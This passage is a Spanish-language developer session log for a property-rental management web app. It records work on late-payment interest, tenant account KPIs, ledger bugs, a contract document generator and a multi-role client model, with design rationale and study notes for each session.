- [ ] **Patrón**: dato de origen inmutable + acumulador separado (template: Patrón o Receta)
- [ ] **Decisión técnica**: fecha como texto `YYYY-MM-DD` vs timestamp — cuándo alcanza con el día (template: Decisión técnica)
- [ ] **Bug**: `getMonto` usaba monto original en vez de saldo restante — cómo un dato "cerca" oculta el dato correcto (template: Bug)

---

## Sesión 2026-04-26 — Punitorios automáticos

### Qué hice

Implementé el sistema completo de punitorios sobre alquileres vencidos, desde el cálculo hasta la auto-generación en base de datos.

1. **Bug de comisión ya estaba corregido** — `flags.ts` tenía `incluirEnBaseComision: false` para `gasto` y `servicio`. Solo tachamos el ítem en PENDIENTES.md.

2. **Tasa del punitorio viene del contrato** — El campo `lateInterestPct` ya existía en el schema de `contract`. Lo traemos por JOIN en la query de cuenta corriente para que cada entrada del ledger lleve la tasa de su propio contrato, no una global.

3. **Popover de punitorio rediseñado** — Ahora tiene un selector de tipo:
   - *Tasa del contrato*: usa `lateInterestPct`, calcula automático
   - *TIM (BCRA)*: usa 4%/mes ÷ 30 como tasa diaria (placeholder hasta conectar API BCRA)
   - *Manual*: campo de porcentaje diario que calcula el monto, y viceversa; muestra el equivalente en TNA

4. **Fórmula corregida** — La tasa en el contrato es diaria (no mensual). El cálculo correcto es `alquiler × tasa_diaria × días_mora`, sin dividir por 30. Para TIM sí se divide porque TIM es mensual.

5. **Auto-generación al abrir la cuenta corriente** — El endpoint `GET /api/tenants/[id]/cuenta-corriente` ahora, antes de devolver los datos:
   - Busca alquileres vencidos con tasa > 0 configurada
   - Si no existe punitorio `isAutoGenerated=true` vinculado → lo crea
   - Si existe pero el monto cambió (más días de mora) → lo actualiza
   - Si la tasa es `null` o `0` → no genera nada

6. **Botón "+ Punitorio" eliminado** — Ya no tiene sentido crearlo a mano.

7. **Comportamiento al borrar** — Si el punitorio se cancela sin emitir recibo, al volver a la pantalla el sistema lo regenera automáticamente.

### Por qué lo hice así y no de otra forma

- **JOIN en vez de query separada para la tasa**: cada entrada del ledger necesita la tasa de *su* contrato, no una tasa global. Si el inquilino tiene contratos con distintas tasas (histórico), cada punitorio calcula con la que corresponde.

- **Tasa en el contrato = tasa diaria**: en alquileres argentinos los punitorios se expresan como porcentaje diario del alquiler. La TIM es mensual y se convierte. Tener criterios distintos por tipo evita que el staff tenga que hacer la conversión en la cabeza.

- **Auto-generar en el GET y no con un cron job**: lo más simple que funciona. El punitorio siempre está actualizado cuando lo ves, sin necesidad de infraestructura de tareas programadas. La desventaja es que el GET tiene un side-effect (escribe en la DB), pero para este caso es aceptable.

- **Regenerar si se borra**: el punitorio es una consecuencia matemática del contrato vencido. Si no se cobra (no se emite recibo), no desaparece. Si el propietario decide perdonarlo, el mecanismo correcto es cambiar la tasa en el contrato a 0.

### Conceptos que aparecieron

- **Side effect en un GET**: en teoría un GET no debería modificar datos (es "idempotente" — ejecutarlo mil veces da el mismo resultado). Acá lo violamos intencionalmente porque es lo más práctico. Hay sistemas que usan endpoints separados tipo `POST /sincronizar` para esto.
- **Tasa diaria vs tasa mensual**: una tasa mensual se divide entre los días del mes para obtener la tasa diaria equivalente. No es lo mismo que la tasa diaria declarada directamente.
- **TNA (Tasa Nominal Anual)**: la forma estándar de comparar tasas de distinta frecuencia. TNA = tasa_diaria × 365. No considera el efecto compuesto (eso sería la TEA).
- **isAutoGenerated flag**: marca en la DB que distingue registros creados por el sistema de los creados por el usuario. Permite saber cuáles se pueden sobreescribir automáticamente sin perder datos que alguien cargó a mano.

### Preguntas para reflexionar

1. ¿Qué diferencia hay entre TNA y TEA? ¿Cuándo importa esa diferencia en la práctica?
2. Si un inquilino tiene dos contratos activos con distintas tasas, ¿cómo sabría el sistema cuál tasa aplicar a cada alquiler? ¿Está resuelto hoy?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: TNA vs TEA — qué son, cómo se calculan, cuándo importa la diferencia
- [ ] **Patrón**: auto-generación en GET — cuándo es válido tener side-effects en un endpoint de lectura
- [ ] **Concepto**: `isAutoGenerated` como flag de distinción sistema vs usuario en registros de DB
- [ ] **Decisión técnica**: tasa del punitorio viene del contrato (no de la agencia) — por qué tiene sentido y cuándo cambiaría
- [ ] **Bug**: fórmula de punitorio dividía por 30 una tasa que ya era diaria — cómo detectarlo: verificar la cuenta manualmente

---

## Sesión 2026-04-26 — KPIs de cuenta corriente del inquilino

### Qué hice

Trabajé sobre los tres KPI cards de la pestaña Cuenta Corriente del inquilino. Arreglé bugs, mejoré la información mostrada y corregí violaciones de diseño.

1. **Bug: KPI "Próximo pago" mostraba "—"** — La query filtraba `period >= hoy`, descartando meses atrasados pendientes. Fix: eliminar el filtro de fecha y tomar el primer pendiente sin importar el período.

2. **"Próximo pago" rediseñado para mostrar el mes que viene** — En vez del primer alquiler pendiente, ahora muestra la suma de todo lo pendiente del próximo mes calendario (alquiler + cargos extras). Si ese mes tiene ajuste de índice pendiente (`pendiente_revision`), muestra el monto mínimo conocido (`≥ $X`) con un badge "Ajuste" en naranja.

3. **"Estado en mora" con desglose de deuda** — Cuando el inquilino está en mora, la card de Estado ahora muestra: `$X capital + $Y intereses = $Z deuda`. El capital son los alquileres vencidos no pagados; los intereses son los punitorios pendientes. Si no hay punitorios, se omite esa parte.

4. **Nuevo KPI "Puntualidad"** (reemplazó "Cobrado 2026") — Muestra el promedio histórico de días de atraso calculado sobre todos los alquileres pagados: verde si paga en fecha o antes, naranja si paga hasta 7 días tarde, rojo si pasa los 7 días.

5. **Sub-proyecto E agregado a PENDIENTES** — Anotamos el score de cliente completo (reclamos + calificación de humor del staff) como tarea de baja prioridad con los pasos de diseño de schema.

6. **Corrección de style guide** — `text-amber-400` reemplazado por `text-warning` en todos los usos del módulo. Agregué `--color-warning` y `--color-warning-dim` al `globals.css` para que Tailwind v4 los exponga como clases utilitarias.

### Por qué lo hice así y no de otra forma

- **"Mes que viene" y no "próximo sin pagar"**: el KPI "Próximo pago" responde a la pregunta *¿cuánto tengo que cobrar la próxima vez que venga el vencimiento?*. La mora ya está cubierta por la card de Estado. Dos KPIs con propósitos distintos es mejor que uno que intente hacer las dos cosas.

- **Monto mínimo con `≥`**: cuando el mes que viene tiene ajuste pendiente el monto es desconocido, pero sabemos que al menos va a ser igual al mes anterior. Mostrar un piso con el símbolo `≥` es más útil que "A confirmar" solo.

- **Día promedio sin `font-mono` en texto descriptivo**: `font-mono` se reserva para montos en pesos porque garantiza alineación de dígitos en columnas. "En fecha" o "8 días antes" son texto descriptivo, no necesitan alineación tabular.

- **`--color-warning` en globals.css en vez de `text-amber-400`**: Tailwind v4 expone variables CSS como clases si se declaran con el prefijo `--color-*`. Así `text-warning` funciona igual que `text-income`. Si mañana se quiere cambiar el tono ámbar de toda la app, se edita una sola línea en el CSS.

### Conceptos que aparecieron

- **`font-mono` para números**: en tipografía monoespaciada cada dígito tiene el mismo ancho. Cuando apilás números en columnas (tabla de montos) se alinean solos. Para texto libre no tiene sentido.
- **`--color-*` en Tailwind v4**: el framework escanea las variables CSS con ese prefijo y genera clases utilitarias automáticamente (`text-income`, `bg-income-dim`, etc.). No hace falta declarar nada en `tailwind.config`.
- **Tokens semánticos vs colores hardcodeados**: `text-warning` puede ser ámbar hoy y cambiar mañana sin tocar ningún componente. `text-amber-400` siempre va a ser ese ámbar específico, sin importar el contexto.
- **Piso de estimación**: cuando un valor exacto no está disponible todavía (el ajuste no se aplicó), mostrar el mínimo conocido con `≥` es una práctica de UX que reduce incertidumbre sin prometer algo que no está confirmado.

### Preguntas para reflexionar

1. ¿Cuándo conviene mostrar "A confirmar" en lugar de un valor estimado? ¿Qué información necesitás para decidir si un piso es confiable?
2. Si el promedio de días de pago fuera parte de un score más grande, ¿cómo pesarías los distintos factores? ¿Todos igual o algunos tienen más peso?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: `font-mono` y tipografía tabular — cuándo usarla y por qué alinea números
- [ ] **Patrón**: tokens semánticos en Tailwind v4 con `--color-*` — cómo se declaran y cómo se usan
- [ ] **Decisión técnica**: separar KPIs por propósito (mora vs próximo pago) en lugar de combinar todo en uno
- [ ] **Patrón**: mostrar valor mínimo estimado con `≥` cuando el dato exacto no está disponible todavía

---

## Sesión 2026-04-26 — Bugs post-implementación + planificación de sub-proyectos

### Qué hice

Continué la sesión anterior donde se habían implementado las 19 tareas del plan Cuenta Corriente v2. Al probar en el navegador aparecieron varios bugs que fui resolviendo:

1. **Bug: TypeError `ledgerEntries.filter` undefined** — El `queryFn` de TanStack Query no tiraba error en respuestas no-2xx (fetch no lanza en errores HTTP). Solución: agregar `if (!r.ok) throw new Error(...)` en el queryFn. También agregué `= []` como default en el destructure.

2. **Bug: props incorrectos en page.tsx** — La página de inquilinos llamaba al componente reescrito con los props viejos (`tenantId`, `tenantName`, etc.) en lugar del nuevo `inquilinoId`. El componente recibía `undefined` y la API fallaba.

3. **Bug: `contract_tenant` vacía** — Los contratos existían pero no tenían inquilinos vinculados (la tabla intermedia estaba vacía). Creé `scripts/fix-and-generate.ts` para poblar la relación y generar el ledger manualmente.

4. **Bug: `tenant_ledger` sin datos** — La tabla existía pero no tenía entradas porque nunca se llamó al endpoint `generate-ledger`. El script lo resolvió generando 24 entradas para el contrato activo.

5. **Bug: `db:migrate` falla** — Las migraciones se aplicaron con `db:push` en sesiones anteriores. El historial de `__drizzle_migrations` está desincronizado. Workaround: seguir con `db:push` en dev.

6. **UX: rediseño del layout de cuenta corriente** — A pedido del usuario, reestructuré el componente:
   - Panel scrolleable con altura propia (`max-h: calc(100dvh - 420px)`)
   - Botón "Emitir recibo" siempre visible abajo (antes solo aparecía al seleccionar)
   - Diálogo de confirmación con desglose completo + campo de observaciones
   - Diálogo de cargo manual implementado (era TODO en el plan)
   - Default de vista cambiado a "Solo historial"
   - Filas del ledger clickeables para seleccionar (antes solo el checkbox de 28px)
   - Opacidad de meses pasados subida de 40% a 60%
   - Auto-scroll al período actual al cargar

7. **Planificación de próximos pasos** — Identificamos 4 sub-proyectos pendientes (ver handoff).

### Por qué lo hice así y no de otra forma

- **fetch + TanStack Query**: `fetch` resuelve el promise aunque el servidor devuelva 403/500. TanStack Query solo marca `isError=true` si el promise se rechaza. Solución estándar: verificar `r.ok` manualmente.

- **Layout con `max-h` en lugar de `flex-1`**: El wrapper padre de la pestaña tiene `overflow-y-auto`, lo que impide que `flex-1` funcione en hijos (el padre no tiene altura fija). `max-h` con valor viewport es más predecible en este contexto.

- **`stopPropagation` en acciones de fila**: Hacer la fila clickeable para seleccionar requiere bloquear la propagación en el Input de monto y en los botones de acción internos, para que no disparen la selección accidentalmente.

### Conceptos que aparecieron

- **fetch vs XHR**: `fetch` no lanza en errores HTTP (4xx, 5xx), solo en errores de red. Hay que verificar `response.ok` manualmente.
- **TanStack Query isError**: Solo se activa si el queryFn tira una excepción. Si devuelve un objeto `{ error: "..." }`, `isError` queda en `false`.
- **event.stopPropagation()**: Evita que el evento click "suba" por el árbol de componentes y dispare handlers de los padres.
- **100dvh vs 100vh**: `dvh` (dynamic viewport height) excluye la barra del navegador en móvil. Más preciso para layouts full-screen.
- **contract_tenant**: Tabla intermedia de la relación muchos-a-muchos entre contratos e inquilinos. Si está vacía, el contrato no tiene inquilino vinculado y el ledger no se puede generar.

### Preguntas para reflexionar

1. ¿Por qué `db:push` no actualiza el historial de migraciones? ¿Qué diferencia hay con `db:migrate`?
2. Si una fila es clickeable pero tiene elementos interactivos dentro, ¿qué otros patrones existen además de `stopPropagation` para manejar esto?

### Qué debería anotar en Obsidian

- [ ] **Patrón**: fetch + TanStack Query — siempre verificar `r.ok` en el queryFn para que `isError` funcione correctamente
- [ ] **Bug**: diferencia entre `db:push` y `db:migrate` en Drizzle — cuándo usar cada uno
- [ ] **Concepto**: event bubbling y stopPropagation — cómo funciona el click en elementos anidados
- [ ] **Decisión técnica**: layout con `max-h` calc(100dvh - Xpx) vs flex-1 para paneles scrolleables

---

## Sesión 2026-04-23 — Unificación visual de KPI cards en Propiedades

### Qué hice

Actualicé el componente `KpiCard` en `src/components/properties/property-list.tsx` para que use el mismo patrón visual que las tarjetas de estadísticas de la lista de inquilinos.

**Antes:** `KpiCard` era un componente completamente custom con gradientes y colores hardcodeados via `style={{}}` inline (props `bgGradient`, `borderColor`, `valueColor`). No tenía iconos. El layout usaba `flex gap-3`.

**Después:**
- Usa `Card + CardContent` de shadcn con clases estándar (`rounded-xl border py-0 gap-0`, `p-4`)
- Layout interno `flex items-start justify-between` con un icono de Lucide en la esquina superior derecha
- Tipografía unificada: `text-xs font-medium text-muted-foreground uppercase tracking-wide` para el label, `text-3xl font-bold tabular-nums` para el número
- Colores del número via `valueClassName` (clase de Tailwind) en lugar de `style={{ color: ... }}`
- Layout externo cambiado a `grid grid-cols-2 gap-3 sm:grid-cols-4` — igual que inquilinos, más responsivo
- Iconos elegidos: `Building2` (total), `Key` (alquiladas), `CheckCircle2` (disponibles), `Tag` (en venta)

### Por qué lo hice así y no de otra forma

**`valueClassName` en lugar de `valueColor` con `style={{}}`:** los `style={{}}` inline rompen el sistema de diseño — no aprovechan las clases de Tailwind ni el modo oscuro. Con `valueClassName` el componente acepta cualquier clase de Tailwind, lo que es más consistente con el resto del proyecto.

**Saqué `bgGradient` y `borderColor` completamente:** los gradientes diferenciaban visualmente cada card, pero ese efecto "temático" es justamente lo que hacía que las propiedades se vieran distintas al resto de la app. El diseño de shadcn sin fondo personalizado es más limpio y consistente.

**`grid` en lugar de `flex`:** `flex` con `flex-1` en cada card funciona bien en desktop, pero en mobile los cuatro KPIs quedarían muy estrechos. `grid-cols-2 sm:grid-cols-4` es el mismo patrón que usan los inquilinos y se adapta mejor.

### Conceptos que aparecieron

- **Inline styles vs. clases de Tailwind:** `style={{ color: "var(--algo)" }}` y `className="text-[var(--algo)]"` producen el mismo resultado visual, pero las clases de Tailwind participan del sistema de purging y son más fáciles de inspeccionar en DevTools. Los inline styles solo tienen sentido cuando el valor es dinámico y calculado en runtime.
- **Sistema de diseño consistente:** cuando un componente usa su propio sistema de colores y tipografía (gradientes custom, tamaños de fuente únicos), se desconecta visualmente del resto aunque use los mismos tokens. La consistencia no es solo usar las mismas variables — es usar los mismos patrones de layout y composición.

### Preguntas para reflexionar

1. ¿Cuándo tiene sentido que un componente tenga su propio estilo custom vs. usar los patrones del sistema de diseño? ¿Hay casos donde el custom styling agrega valor real?
2. Las KPI cards de inquilinos no tienen color en el número del total (usa el color de texto por defecto), pero alquiladas, disponibles y en venta sí tienen colores. ¿Qué criterio usarías para decidir cuándo colorear un número en un KPI?

### Qué debería anotar en Obsidian

- [ ] Concepto: `style={{}}` inline vs. `className` — cuándo usar cada uno y por qué las clases de Tailwind son preferibles
- [ ] Patrón: KPI card con shadcn — `Card + CardContent`, icono en esquina, tipografía unificada
- [ ] Decisión técnica: `valueClassName` en lugar de `valueColor` — pasar clases en lugar de valores CSS raw

---

## Sesión 2026-04-23 — Módulo generador de documentos: markdown, variables libres, catálogo expandido y Parte Locadora

### Qué hice

Completamos el módulo de generador de documentos con cuatro bloques grandes:

**1. Catálogo de variables expandido** (`src/lib/document-templates/variables-catalog.ts`)
- De 16 variables pasamos a ~80. Nuevas categorías: `"administradora"` (razón social, CUIT, CBU, ciudad, provincia, etc.) y ampliación de `"propietario"`, `"inquilino"`, `"contrato"`.
- Aliases legales: `locador.*` y `locatario.*` apuntan a los mismos datos que `propietario.*` e `inquilino.*` — en los contratos argentinos se usan ambos términos.
- Fiadoras 1/2/3: 21 entradas que eran copy-paste se reemplazaron por un generador `[1,2,3].flatMap(...)`.
- Variables sin campo en el schema (ej: `propiedad.domicilio_calle`) retornan `null` con resolver declarado — el path ya existe, cuando se extienda el schema solo hay que actualizar el resolver.

**2. Markdown y variables de texto libre** (`src/lib/document-templates/render-segments.tsx`)
- Soporte de `**negrita**`, `*cursiva*`, `__subrayado__`, `# ## ### ####` (headers h3–h6) dentro del cuerpo de cláusulas.
- Variables de texto libre `{{nombre [default]}}`: no se resuelven desde el contrato sino desde un formulario que el usuario completa antes de imprimir. Se muestran en ámbar.
- `parseFreeTextVarsFromBodies(bodies[])`: extrae todas las `{{vars}}` únicas de una lista de cuerpos.

**3. Editor actualizado** (`src/app/(dashboard)/generador-documentos/[id]/document-template-editor.tsx`)
- Resaltado de sintaxis en el textarea: verde = variable resuelta, rojo = faltante, ámbar = texto libre, gris = `[[if:]]`.
- `FreeTextVarsPanel`: panel destacado en ámbar que aparece automáticamente en la columna de preview cuando hay `{{vars}}` en el documento.
- Panel de variables reorganizado en 6 grupos colapsables (propiedad, propietario/locador, inquilino/locatario, contrato, administradora, garantes/fiadoras).
- `CATALOG_BY_GROUP`: agrupación pre-calculada al cargar el módulo, evita filtrar el catálogo en cada render.

**4. Bug fix: Parte Locadora** (`src/app/api/document-templates/resolve/route.ts`)
- El bug: al cambiar el rol de un propietario de Legal a Real (y viceversa), el documento seguía mostrando el propietario viejo porque `resolve` usaba `contract.ownerId` fijo.
- El fix: `resolve` ahora busca quién tiene rol `"legal"` o `"ambos"` en la propiedad actual. Primero mira el propietario principal, luego los co-propietarios. Si nadie tiene rol legal, usa `contract.ownerId` como fallback.
- Optimización: el propietario principal se busca en Round 1 (paralelo), así en el 99% de los casos no hay round-trip extra. Solo se hace un fetch adicional cuando el locador es un co-propietario distinto.
- Badge "Parte Locadora" en la ficha de la propiedad, junto a quien tiene rol legal.

**Limpieza post-`/simplify`:**
- `isLegalRole = inLegal`: alias innecesario en `page.tsx`, eliminado.
- Doble guard en `FreeTextVarsPanel`: inner guard `vars.length === 0` removido (el call site ya lo guarda).
- `VARIABLES_CATALOG.filter()` en render: reemplazado por `CATALOG_BY_GROUP` calculado una vez.
- 21 entradas copy-paste de fiadoras: reemplazadas por `flatMap` con generador.

### Por qué lo hice así y no de otra forma

**Variables de texto libre como formulario, no como variables del contrato.** Podría haber creado un campo en el schema para cada dato faltante. Pero muchos datos son específicos de cada instancia del documento (ej: la fecha de firma exacta), no del contrato en general. El sistema `{{var}}` permite capturarlos en el momento de imprimir sin modificar la base de datos.

**Aliases locador/propietario en lugar de renombrar.** Los contratos argentinos usan "locador" en el texto legal pero "propietario" en el lenguaje de la inmobiliaria. En vez de elegir uno, los dos paths apuntan al mismo dato. El editor muestra ambos en el panel de variables.

**Parte Locadora desde la propiedad, no desde el contrato.** El `contract.ownerId` es un snapshot del momento en que se creó el contrato. Si cambian los roles después, el documento quedaría desactualizado. Al buscar en la propiedad actual, el documento siempre refleja la realidad vigente. La contrapartida es que si alguien cambia roles por error, el documento también cambia — pero eso es manejable con permisos.

**Round 1 + fetch condicional en el resolve API.** La alternativa más simple era siempre hacer dos rounds de DB. Pero en el 99% de los contratos el propietario principal es el legal, y ya teníamos su ID en `contractRow.ownerId`. Buscarlo en Round 1 (paralelo con todo lo demás) evita la latencia extra en el caso común.

### Conceptos que aparecieron

- **Backdrop textarea:** técnica para superponer HTML coloreado detrás de un `<textarea>` transparente. Un div "sombra" invisible crece el contenedor; un div "backdrop" con `dangerouslySetInnerHTML` muestra el HTML; el textarea encima tiene `color: transparent` pero `caretColor` visible. El scroll se sincroniza manualmente con `onScroll`.
- **Regex global con `lastIndex`:** las regex con flag `/g` guardan su posición en `lastIndex`. Si reutilizás la misma instancia (como `FREE_VAR_RE`) en múltiples llamadas, tenés que resetear `lastIndex = 0` antes de cada uso, si no, empieza desde donde terminó la vez anterior.
- **Two-round DB fetching:** cuando un query depende del resultado de otro, no podés paralelizarlos. La solución es buscar en Round 1 todo lo que no tiene dependencias (incluyendo datos que probablemente ya alcancen), y solo en Round 2 hacer el fetch condicional que depende de Round 1. En el caso feliz, Round 2 no tiene ese fetch extra.
- **Variables de plantilla vs. variables de contrato:** las `[[variables]]` se resuelven desde la base de datos (datos persistidos). Las `{{variables}}` se capturan en el momento de uso (datos efímeros, no persistidos). Son dos niveles distintos de "completar" un documento.
- **Generator pattern para catálogo:** cuando tenés N grupos de M campos idénticos (fiadoras 1/2/3 con apellido/dni/cuit/...), un `flatMap` con una función `mk(field, label, resolver)` evita 21 objetos literales casi iguales. El código dice "generá 7 campos para cada una de las 3 fiadoras" en vez de repetir 21 veces.

### Preguntas para reflexionar

1. Si un contrato tiene dos co-propietarios legales (ambos con rol "ambos"), el resolve toma el primero que encuentra. ¿Debería el sistema avisar que hay ambigüedad, o es suficiente con el orden de carga?
2. Las `{{variables de texto libre}}` son efímeras: si cerrás el editor, se pierden. Para un contrato real que vas a imprimir muchas veces (ej: copias para distintas partes), ¿tiene sentido persistirlas? ¿Dónde las guardarías sin romper la plantilla reutilizable?

### Qué debería anotar en Obsidian

- [ ] Patrón: Backdrop textarea para syntax highlighting — cómo superponer HTML coloreado sobre un textarea
- [ ] Concepto: Two-round DB fetching — cuándo paralelizar y cuándo necesitás secuenciar queries
- [ ] Decisión técnica: Variables efímeras {{}} vs. variables persistidas [[]] — por qué no guardamos los valores de texto libre en la DB
- [ ] Patrón: Generator con flatMap para catálogos repetitivos — reemplazar copy-paste de objetos literales
- [ ] Bug: Parte Locadora congelada en `contract.ownerId` — por qué resolver desde la propiedad actual y no desde el contrato

---

## Sesión 2026-04-21 — Modelo multi-rol de clientes y tenants sin contrato vigente

### Qué hice

Resolvimos dos problemas conectados: (1) un bug que hacía que Matías Konstantinides no apareciera en `/inquilinos` y (2) el diseño de cómo manejar clientes con múltiples roles simultáneos (alguien que cobra un alquiler como propietario y paga otro como inquilino).

**Bug fix:** el API de tenants filtraba por `client.type = "inquilino"` (español), pero el schema siempre usó inglés (`"tenant"`). Se normalizó a inglés en todos los routes. Se creó un script de migración de DB.

**Modelo multi-rol:** un cliente es una persona única con roles derivados de sus relaciones:
- `tenant` si tiene `type = "tenant"` o está en `contract_tenant`
- `owner` si tiene propiedades o contratos como propietario
- `guarantor` si está en `contract_guarantee`

**Tenants sin contrato activo:** ahora `/inquilinos` muestra tenants con contratos en cualquier estado. Nuevos estados: `pendiente_firma` (badge amarillo), `historico` (badge gris). No se calcula mora para esos estados.

**Selector de roles:** nuevo componente `ClientRolesBadges` que aparece en la ficha del inquilino y del propietario. Si la persona también tiene otro rol, muestra un chip clickeable que lleva a la otra vista.

**Archivos modificados:**
- `src/lib/tenants/status.ts` — nuevos estados `pendiente_firma` e `historico`
- `src/app/api/tenants/route.ts` — filtro por relación + tipo, inglés
- `src/app/api/tenants/[id]/route.ts` — sin filtro de tipo, contratos de cualquier status
- `src/app/api/tenants/[id]/movimientos/route.ts` — normalización de tipo
- `src/components/tenants/tenants-list.tsx` — nuevos badges y filtros
- `src/app/(dashboard)/inquilinos/[id]/page.tsx` — nuevos estados, bug fix de URL, integración de roles
- `src/app/(dashboard)/propietarios/[id]/page.tsx` — integración de roles

**Archivos nuevos:**
- `src/app/api/clients/[id]/roles/route.ts` — endpoint que devuelve roles derivados
- `src/components/clients/client-roles-badges.tsx` — badges cross-link entre roles
- `scripts/migrate-client-type-to-english.ts` — migración one-shot ya ejecutada

### Por qué lo hice así y no de otra forma

**No duplicamos clientes.** La alternativa era crear dos registros distintos para la misma persona (uno como propietario, otro como inquilino). Eso rompe la integridad: si cambia el teléfono, tenés que actualizar dos lugares y podés tener info desactualizada. En cambio, un cliente = una persona, y los roles se calculan desde las relaciones que ya existen (contratos, propiedades).

**Roles derivados, no almacenados.** La alternativa era guardar los roles en una tabla `client_role` o en un array en `client`. No lo hicimos porque agregar una tabla nueva requiere migración, y los roles ya están implícitos en las tablas de contratos y propiedades. Derivar evita sincronización manual.

**OR entre type y contract_tenant.** Matías tiene `type = "tenant"` pero todavía no está asignado a ningún contrato. La query pura por relación no lo hubiera mostrado. El OR entre tipo Y relación cubre ambos casos: clientes creados como tenants que todavía no tienen contrato, y clientes de otro tipo que son inquilinos por relación.

### Conceptos que aparecieron

- **Modelo polimórfico:** una sola tabla `client` representa personas con distintos roles. Los roles no se guardan en un campo fijo sino que se calculan desde las relaciones. Es más flexible pero requiere más queries.
- **Estado derivado vs. almacenado:** el estado de un inquilino (`activo`, `en_mora`, etc.) no se guarda en la base de datos — se calcula cada vez que se pide. Si se guardara, podría quedar desactualizado. Calcular es más trabajo pero siempre correcto.
- **Prioridad de contratos:** cuando un cliente tiene múltiples contratos (activo + uno histórico), ¿cuál mostramos? Asignamos un número de prioridad a cada status y elegimos el más relevante. Es una regla de negocio arbitraria pero explícita.
- **OR condition en Drizzle:** `or(eq(campo, valor1), inArray(campo, lista))` combina dos condiciones de filtro con OR. SQL equivalente: `WHERE type = 'tenant' OR id IN (...)`.

### Preguntas para reflexionar

1. ¿Qué pasa cuando alguien fue inquilino, se terminó su contrato, y dos años después es inquilino en otro lugar con la misma agencia? ¿Cómo distinguís el historial del primer contrato del segundo?
2. Si un cliente tiene rol `tenant` por `type` pero nunca se le asigna un contrato, ¿debería aparecer en la lista para siempre o hay un momento donde "caduca" ese rol?

### Qué debería anotar en Obsidian

- [ ] Concepto: Modelo polimórfico — una tabla, múltiples roles derivados de relaciones
- [ ] Decisión técnica: Roles derivados vs. almacenados — por qué no usamos tabla `client_role`
- [ ] Patrón: OR condition para "tipo declarado" + "relación existente" en queries de listado
- [ ] Bug: `client.type = "inquilino"` (español) vs. `"tenant"` (inglés) — cómo detectar este tipo de inconsistencia en el futuro

---

## Sesión 2026-04-20 — Ficha de contrato con tabs y schema de participantes

### Qué hice

Construí tres capas: schema, API y UI.

**Schema** — Tres tablas nuevas en PostgreSQL aplicadas con `db:push`:
- `contract_participant` — vincula un contrato con un cliente en un rol (owner/tenant/guarantor). Reemplaza a `contract_tenant`.
- `contract_guarantee` — registra garantías personales (cliente) o reales (propiedad interna o externa con campos libres).
- `contract_document` — almacena archivos adjuntos al contrato (PDF, JPG, PNG guardados en `/public/uploads/contracts/[id]/`).

**API** — Ocho endpoints nuevos (`POST/DELETE` para participants, guarantees y documents). Se extendió el `GET /api/contracts/[id]` para devolver los tres arrays nuevos, y el `PATCH` para ejecutar la lógica de activación: cuando el status cambia a "active", busca los participantes con role="tenant" y setea `client.type = 'tenant'` en la DB.

El `POST /api/contracts` (crear contrato) ahora escribe en `contractParticipant` en vez de `contract_tenant`. El `GET /api/contracts` (lista) también lee de la tabla nueva.

**UI** — Cuatro tabs en la ficha `/contratos/[id]`: Partes, Operativo, Documentos, Datos para documentos. El contenido previo (condiciones, cláusulas, acta, actividad, servicios) quedó en el tab Operativo sin tocar. Los tres tabs nuevos son componentes propios.

También se extendió el formulario de creación de contrato con una sección de garantes (combobox con búsqueda + popup "Crear nueva persona").

### Por qué lo hice así y no de otra forma

- **No reescribí el contrato-detail.tsx de cero**: tiene 1310 líneas con lógica compleja de edición inline. Envolverlo en tabs con un fragmento condicional fue mucho más seguro que extraerlo todo.
- **`contractParticipant` reemplaza `contract_tenant`** en código nuevo, pero deja la tabla vieja declarada en el schema sin eliminarla — así no rompemos nada hasta confirmar que ninguna consulta depende de ella.
- **Enums en inglés en código nuevo** (`owner/tenant/guarantor`), sin migrar los datos existentes en español. Es una deuda técnica documentada.
- **Archivos en `/public/uploads/`**: suficiente para MVP. Para producción real habría que usar S3 o similar.

### Conceptos que aparecieron

- **discriminated union en TypeScript**: el schema de Zod para garantías usa `z.discriminatedUnion("type", [...])` — el tipo depende del valor de un campo específico (`"personal"` o `"real"`). Drizzle ORM no lo acepta directo en el `insert`, tuvimos que construir el objeto de forma condicional.
- **Fragment de React (`<>...</>`)**: cuando un componente necesita devolver múltiples elementos sin un div contenedor. Lo usamos para envolver todo el contenido del tab Operativo en un solo bloque condicional.
- **`useSearchParams` + `router.replace`**: patrón para guardar el tab activo en la URL (`?tab=partes`). Permite compartir el link y que el botón atrás del navegador funcione.
- **`$defaultFn(() => crypto.randomUUID())`**: forma de decirle a Drizzle que genere el ID automáticamente al insertar, sin pasarlo desde el código.
- **shadcn `AlertDialog`**: componente de confirmación modal antes de ejecutar una acción destructiva (ej: eliminar documento). Diferente al `alert()` nativo del browser: es accesible y estilizable.

### Preguntas para reflexionar

1. ¿Por qué conviene guardar el tab activo en la URL (`?tab=`) en vez de en estado local del componente (`useState`)?
2. Si `contract_tenant` y `contractParticipant` tienen datos distintos (datos viejos en la vieja, datos nuevos en la nueva), ¿qué pasa cuando alguien abre un contrato viejo en la ficha nueva?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: `useSearchParams` + `router.replace` como forma de sincronizar UI state con la URL
- [ ] **Patrón**: wrapping condicional de tabs con fragment (`<>`) en componentes grandes sin refactorizar
- [ ] **Decisión técnica**: reemplazar tabla legacy (`contract_tenant`) gradualmente en código nuevo, sin migración de datos ni borrado de la tabla vieja
- [ ] **Bug**: discriminated union de Zod no es compatible directamente con Drizzle `insert` — hay que construir el objeto condicionalmente
- [ ] **Concepto**: `$defaultFn` en Drizzle vs. generar el UUID en el handler de la API

---

## Sesión 2026-04-17 — Migración shadcn/ui: lista e inquilinos

### Qué hice

Audité y migré los componentes custom del módulo **inquilinos** (lista + ficha) para que usen componentes de shadcn/ui en lugar de markup manual.

**Auditoría (agente `shadcn-migration-auditor`):**
- Lista: 6 componentes encontrados (1 alto, 1 medio, 4 bajo)
- Ficha: 16 piezas encontradas en 5 archivos (1 alto, 5 medio, 9 bajo + 1 ya migrado)

**Componentes instalados esta sesión:**
- `Progress` (`src/components/ui/progress.tsx`)
- `Alert` (`src/components/ui/alert.tsx`)

**Migraciones completadas — lista (`inquilinos-list.tsx`):**
- `StatusBadge`: `w-1.5 h-1.5` → `size-1.5`
- `EntityAvatar`: removido `"use client"` innecesario (sin hooks ni browser APIs)
- `ProgressBar` inline: `div` manual → `Progress` de shadcn con selector `[&>[data-slot=progress-indicator]]` para el color condicional
- `EstadoBadge` inline + 9 íconos: `h-N w-N` → `size-N`
- `ClientPagination`: ternarios de className → `cn()`, `let endPage` → `const`
